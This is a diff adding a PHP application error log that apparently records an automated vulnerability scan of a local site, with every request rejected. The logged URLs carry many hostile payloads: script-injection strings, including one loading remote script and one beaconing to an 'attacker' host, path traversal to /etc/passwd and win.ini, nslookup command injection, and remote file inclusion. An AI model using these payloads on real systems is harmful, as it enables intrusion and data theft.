@@ -1,0 +1,2111 @@
+[ 2017-11-18T19:19:52+08:00 ] 127.0.0.1 //index.php/component/users/?view=registration
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000551s ]
+ERR: 无法加载模块:Component
+
+[ 2017-11-18T19:19:52+08:00 ] 127.0.0.1 //index.php/customer/account/create/
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000696s ]
+ERR: 无法加载模块:Customer
+
+[ 2017-11-18T19:19:53+08:00 ] 127.0.0.1 //index.php/register/
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000664s ]
+ERR: 无法加载模块:Register
+
+[ 2017-11-18T19:45:31+08:00 ] 127.0.0.1 /index.php/FHya0/
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000860s ]
+ERR: 无法加载模块:FHya0
+
+[ 2017-11-18T19:45:31+08:00 ] 127.0.0.1 /index.php/967706%40
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000555s ]
+ERR: 无法加载模块:967706@
+
+[ 2017-11-18T19:45:31+08:00 ] 127.0.0.1 /index.php/1<ScRiPt>8LSD(9418)</ScRiPt>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000703s ]
+ERR: 无法加载模块:18LSD(9418)
+
+[ 2017-11-18T19:45:31+08:00 ] 127.0.0.1 /index.php/<WKVDG0>YXP9V[!%2b!]</WKVDG0>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000534s ]
+ERR: 无法加载模块:YXP9V[!+!]
+
+[ 2017-11-18T19:45:31+08:00 ] 127.0.0.1 /index.php/<ScRiPt%20%0d%0a>8LSD(9317)</ScRiPt>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000786s ]
+ERR: 无法加载模块:8LSD(9317)
+
+[ 2017-11-18T19:45:31+08:00 ] 127.0.0.1 /index.php/<ScRiPt/acu%20src=//testasp.vulnweb.com/t/xss.js%3f9070></ScRiPt>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000686s ]
+ERR: 无法加载模块:
+
+[ 2017-11-18T19:45:31+08:00 ] 127.0.0.1 /index.php/<video><source%20onerror="javascript:8LSD(9420)">
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000927s ]
+ERR: 无法加载模块:
+
+[ 2017-11-18T19:45:31+08:00 ] 127.0.0.1 /index.php/<isindex%20type=image%20src=1%20onerror=8LSD(9600)>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000726s ]
+ERR: 无法加载模块:
+
+[ 2017-11-18T19:45:31+08:00 ] 127.0.0.1 /index.php/<iframe%20src='data:text/html;base64%2cPHNjcmlwdD5hbGVydCgnYWN1bmV0aXgteHNzLXRlc3QnKTwvc2NyaXB0Pgo='%20invalid='9201'>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000581s ]
+ERR: 无法加载模块:
+
+[ 2017-11-18T19:45:31+08:00 ] 127.0.0.1 /index.php/<body%20onload=8LSD(9854)>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000547s ]
+ERR: 无法加载模块:
+
+[ 2017-11-18T19:45:31+08:00 ] 127.0.0.1 /index.php/<img/src="//testasp.vulnweb.com/t/dot.gif"onload=8LSD(9900)>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000687s ]
+ERR: 无法加载模块:
+
+[ 2017-11-18T19:45:31+08:00 ] 127.0.0.1 /index.php/<img%20src=xyz%20OnErRor=8LSD(9263)>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000519s ]
+ERR: 无法加载模块:
+
+[ 2017-11-18T19:45:32+08:00 ] 127.0.0.1 /index.php/<img/src=">"%20onerror=alert(9369)>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000618s ]
+ERR: 无法加载模块:
+
+[ 2017-11-18T19:45:32+08:00 ] 127.0.0.1 /index.php/%253C%2553%2563%2552%2569%2550%2574%2520%253E%2538%254C%2553%2544%25289354%2529%253C%252F%2573%2543%2572%2569%2570%2554%253E
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000539s ]
+ERR: 无法加载模块:%3C%53%63%52%69%50%74%20%3E%38%4C%53%44%289354%29%3C%2F%73%43%72%69%70%54%3E
+
+[ 2017-11-18T19:45:32+08:00 ] 127.0.0.1 /index.php/%26lt;ScRiPt%26gt;8LSD(9325)%26lt;/sCripT%26gt;
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000448s ]
+ERR: 无法加载模块:&lt;ScRiPt&gt;8LSD(9325)&lt;
+
+[ 2017-11-18T19:45:34+08:00 ] 127.0.0.1 /index.php%23
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000653s ]
+ERR: 无法加载模块:Index
+
+[ 2017-11-18T19:45:37+08:00 ] 127.0.0.1 /index.php/<input%20autofocus%20onfocus=8LSD(9837)>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000546s ]
+ERR: 无法加载模块:
+
+[ 2017-11-18T19:45:37+08:00 ] 127.0.0.1 /index.php/<a%20HrEF=http://www.vulnweb.com></a>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000460s ]
+ERR: 无法加载模块:
+
+[ 2017-11-18T19:45:37+08:00 ] 127.0.0.1 /index.php/<a%20HrEF=jaVaScRiPT:>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000468s ]
+ERR: 无法加载模块:
+
+[ 2017-11-18T19:45:37+08:00 ] 127.0.0.1 /index.php/[url=http://www.vulnweb.com][/url]
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000551s ]
+ERR: 无法加载模块:[url=http:
+
+[ 2017-11-18T19:45:37+08:00 ] 127.0.0.1 /index.php/<img<!--%20-->%20src=x%20onerror=alert(9115);//><!--%20-->
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000439s ]
+ERR: 无法加载模块:
+
+[ 2017-11-18T19:45:37+08:00 ] 127.0.0.1 /index.php/}body{acu:Expre/**/SSion(8LSD(9676))}
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000578s ]
+ERR: 无法加载模块:}body{acu:Expre
+
+[ 2017-11-18T19:45:37+08:00 ] 127.0.0.1 /index.php/<%25%20contenteditable%20onresize=8LSD(9123)>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000954s ]
+ERR: 无法加载模块:
+
+[ 2017-11-18T19:45:37+08:00 ] 127.0.0.1 /index.php/;qCN05%0a1<ScRiPt>8LSD(9805)</ScRiPt>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000605s ]
+ERR: 无法加载模块:;qCN05
+18LSD(9805)
+
+[ 2017-11-18T19:45:37+08:00 ] 127.0.0.1 /index.php/<WFSTP3>ZULDW[!%2b!]</WFSTP3>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000507s ]
+ERR: 无法加载模块:ZULDW[!+!]
+
+[ 2017-11-18T19:45:37+08:00 ] 127.0.0.1 /index.php/1<ScRiPt>prompt(901465)</ScRiPt>=%a2
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000491s ]
+ERR: 无法加载模块:1prompt(901465)
+
+[ 2017-11-18T19:45:37+08:00 ] 127.0.0.1 /index.php/<ifRAme%20sRc=9325.com></IfRamE>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000775s ]
+ERR: 无法加载模块:
+
+[ 2017-11-18T19:45:37+08:00 ] 127.0.0.1 /index.php/<N6ZNlp%20x=9643>
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000185s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000921s ]
+ERR: 无法加载模块:
+
+[ 2017-11-18T19:45:37+08:00 ] 127.0.0.1 /index.php/<img%20sRc='http://attacker-9825/log.php%3f
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000622s ]
+ERR: 无法加载模块:
+
+[ 2017-11-18T19:45:37+08:00 ] 127.0.0.1 /index.php/<0e6Gr2<
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000620s ]
+ERR: 无法加载模块:
+
+[ 2017-11-18T19:48:20+08:00 ] 127.0.0.1 /public/css/%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\/etc/passwd
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000564s ]
+ERR: 无法加载模块:Public
+
+[ 2017-11-18T19:48:21+08:00 ] 127.0.0.1 /public/css/..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af/etc/passwd
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000454s ]
+ERR: 无法加载模块:Public
+
+[ 2017-11-18T19:48:21+08:00 ] 127.0.0.1 /public/css/..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af/windows/win.ini
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000541s ]
+ERR: 无法加载模块:Public
+
+[ 2017-11-18T19:48:21+08:00 ] 127.0.0.1 /public/css/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/windows/win.ini
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000561s ]
+ERR: 无法加载模块:Public
+
+[ 2017-11-18T19:48:21+08:00 ] 127.0.0.1 /public/css/%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25afetc/passwd
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000543s ]
+ERR: 无法加载模块:Public
+
+[ 2017-11-18T19:48:21+08:00 ] 127.0.0.1 /public/css/%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25afwindows/win.ini
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000671s ]
+ERR: 无法加载模块:Public
+
+[ 2017-11-18T19:48:21+08:00 ] 127.0.0.1 /public/css/..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c/etc/passwd
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000676s ]
+ERR: 无法加载模块:Public
+
+[ 2017-11-18T19:48:21+08:00 ] 127.0.0.1 /public/css/..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c/windows/win.ini
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000616s ]
+ERR: 无法加载模块:Public
+
+[ 2017-11-18T19:48:22+08:00 ] 127.0.0.1 /public/bootstrap/css/..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af/etc/passwd
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000679s ]
+ERR: 无法加载模块:Public
+
+[ 2017-11-18T19:48:22+08:00 ] 127.0.0.1 /public/bootstrap/css/..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af/windows/win.ini
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000596s ]
+ERR: 无法加载模块:Public
+
+[ 2017-11-18T19:48:22+08:00 ] 127.0.0.1 /uploads/..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af/etc/passwd
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000643s ]
+ERR: 无法加载模块:Uploads
+
+[ 2017-11-18T19:48:22+08:00 ] 127.0.0.1 /uploads/..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af/windows/win.ini
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000597s ]
+ERR: 无法加载模块:Uploads
+
+[ 2017-11-18T19:48:23+08:00 ] 127.0.0.1 /public/font-awesome/css/..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af/etc/passwd
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000537s ]
+ERR: 无法加载模块:Public
+
+[ 2017-11-18T19:48:23+08:00 ] 127.0.0.1 /public/font-awesome/css/..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af/windows/win.ini
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000614s ]
+ERR: 无法加载模块:Public
+
+[ 2017-11-18T19:48:23+08:00 ] 127.0.0.1 /public/js/..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af/etc/passwd
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000503s ]
+ERR: 无法加载模块:Public
+
+[ 2017-11-18T19:48:23+08:00 ] 127.0.0.1 /public/js/..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af/windows/win.ini
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000524s ]
+ERR: 无法加载模块:Public
+
+[ 2017-11-18T19:48:24+08:00 ] 127.0.0.1 /public/bootstrap/js/..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af/etc/passwd
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000521s ]
+ERR: 无法加载模块:Public
+
+[ 2017-11-18T19:48:24+08:00 ] 127.0.0.1 /public/bootstrap/js/..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af/windows/win.ini
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: [ app_init ] --END-- [ RunTime:0.002003s ]
+ERR: 无法加载模块:Public
+
+[ 2017-11-18T19:48:24+08:00 ] 127.0.0.1 /public/images/..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af/etc/passwd
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000485s ]
+ERR: 无法加载模块:Public
+
+[ 2017-11-18T19:48:24+08:00 ] 127.0.0.1 /public/images/..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af/windows/win.ini
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000835s ]
+ERR: 无法加载模块:Public
+
+[ 2017-11-18T19:48:26+08:00 ] 127.0.0.1 //index.php/api/xmlrpc
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000465s ]
+ERR: 无法加载模块:Api
+
+[ 2017-11-18T19:48:30+08:00 ] 127.0.0.1 //index.php/api/xmlrpc
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000487s ]
+ERR: 无法加载模块:Api
+
+[ 2017-11-18T19:48:30+08:00 ] 127.0.0.1 //index.php/api/xmlrpc
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000575s ]
+ERR: 无法加载模块:Api
+
+[ 2017-11-18T19:48:30+08:00 ] 127.0.0.1 //index.php/api/xmlrpc
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000413s ]
+ERR: 无法加载模块:Api
+
+[ 2017-11-18T19:48:30+08:00 ] 127.0.0.1 //index.php/api/xmlrpc
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000796s ]
+ERR: 无法加载模块:Api
+
+[ 2017-11-18T19:48:36+08:00 ] 127.0.0.1 /index%252ephp
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000478s ]
+ERR: 无法加载模块:Index
+
+[ 2017-11-18T19:59:24+08:00 ] 127.0.0.1 /admin.php?c=login&m=response.write(9611500*9610217)
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000665s ]
+ERR: 无法加载模块:Response.write(9611500*9610217)
+
+[ 2017-11-18T19:59:24+08:00 ] 127.0.0.1 /admin.php?c=login&m='%2bresponse.write(9611500*9610217)%2b'
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000654s ]
+ERR: 无法加载模块:'+response.write(9611500*9610217)+'
+
+[ 2017-11-18T19:59:25+08:00 ] 127.0.0.1 /admin.php?c=login&m="%2bresponse.write(9611500*9610217)%2b"
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000739s ]
+ERR: 无法加载模块:"+response.write(9611500*9610217)+"
+
+[ 2017-11-18T19:59:25+08:00 ] 127.0.0.1 /admin.php?c=login&m=set%7cset%26set
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000670s ]
+ERR: 无法加载模块:Set|set&set
+
+[ 2017-11-18T19:59:25+08:00 ] 127.0.0.1 /admin.php?c=login&m=%24(nslookup%20IOmZ0HdZ)
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000601s ]
+ERR: 无法加载模块:$(nslookup IOmZ0HdZ)
+
+[ 2017-11-18T19:59:25+08:00 ] 127.0.0.1 /admin.php?c=login&m=fl2faOI9
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000618s ]
+ERR: 无法加载模块:Fl2faOI9
+
+[ 2017-11-18T19:59:25+08:00 ] 127.0.0.1 /admin.php?c=login&m=%26nslookup%208rZ7n3Ki%26'%5c"`0%26nslookup%208rZ7n3Ki%26`'
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000042s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000690s ]
+ERR: 无法加载模块:&nslookup 8rZ7n3Ki&'\"`0&nslookup 8rZ7n3Ki&`'
+
+[ 2017-11-18T19:59:25+08:00 ] 127.0.0.1 /admin.php?c=login&m=http://some-inexistent-website.acu/some_inexistent_file_with_long_name%3F.jpg
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000814s ]
+ERR: 无法加载模块:Http://some-inexistent-website.acu/some_inexistent_file_with_long_name?.jpg
+
+[ 2017-11-18T19:59:25+08:00 ] 127.0.0.1 /admin.php?c=login&m=1some_inexistent_file_with_long_name%00.jpg
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000601s ]
+ERR: 无法加载模块:1some_inexistent_file_with_long_name.jpg
+
+[ 2017-11-18T19:59:25+08:00 ] 127.0.0.1 /admin.php?c=login&m=Http://testasp.vulnweb.com/t/fit.txt
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000668s ]
+ERR: 无法加载模块:Http://testasp.vulnweb.com/t/fit.txt
+
+[ 2017-11-18T19:59:25+08:00 ] 127.0.0.1 /admin.php?c=login&m=../../../../../../../../../../windows/win.ini
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000721s ]
+ERR: 无法加载模块:../../../../../../../../../../windows/win.ini
+
+[ 2017-11-18T19:59:25+08:00 ] 127.0.0.1 /admin.php?c=login&m=http://testasp.vulnweb.com/t/fit.txt%3F.jpg
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000690s ]
+ERR: 无法加载模块:Http://testasp.vulnweb.com/t/fit.txt?.jpg
+
+[ 2017-11-18T19:59:25+08:00 ] 127.0.0.1 /admin.php?c=login&m=testasp.vulnweb.com
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000585s ]
+ERR: 无法加载模块:Testasp.vulnweb.com
+
+[ 2017-11-18T19:59:25+08:00 ] 127.0.0.1 /admin.php?c=login&m=C:%5cWINDOWS%5csystem32%5cdrivers%5cetc%5chosts
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000045s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000870s ]
+ERR: 无法加载模块:C:\WINDOWS\system32\drivers\etc\hosts
+
+[ 2017-11-18T19:59:26+08:00 ] 127.0.0.1 /admin.php?c=login&m=../../../../../../../../../../windows/win.ini%00.jpg
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000564s ]
+ERR: 无法加载模块:../../../../../../../../../../windows/win.ini.jpg
+
+[ 2017-11-18T19:59:26+08:00 ] 127.0.0.1 /admin.php?c=login&m=%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afwindows%c0%afwin.ini
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000737s ]
+ERR: 无法加载模块:������������������������������������������������windows��win.ini
+
+[ 2017-11-18T19:59:26+08:00 ] 127.0.0.1 /admin.php?c=login&m=................windowswin.ini
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000643s ]
+ERR: 无法加载模块:................windowswin.ini
+
+[ 2017-11-18T19:59:26+08:00 ] 127.0.0.1 /admin.php?c=login&m=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000762s ]
+ERR: 无法加载模块:..\..\..\..\..\..\..\..\windows\win.ini
+
+[ 2017-11-18T19:59:26+08:00 ] 127.0.0.1 /admin.php?c=login&m=12345'"\'\");|]*%00{%0d%0a<%00>%bf%27'💩
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000790s ]
+ERR: 无法加载模块:12345'"\'\");|]*{
+�''💩
+
